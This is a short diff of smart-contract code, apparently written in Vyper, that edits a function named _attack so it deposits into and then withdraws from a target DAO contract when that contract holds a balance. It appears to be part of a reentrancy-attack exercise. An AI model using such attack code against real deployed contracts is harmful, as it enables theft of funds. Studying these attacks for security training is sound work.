@@ -17,8 +17,11 @@ def __init__():
 def _attack() -> bool:
     assert self.dao_address != ZERO_ADDRESS
     if self.dao_address.balance > 0:
+        DAO(self.dao_address).deposit()
         DAO(self.dao_address).withdraw()
-
+        return True
+    else:
+        return False
 
     return True
 
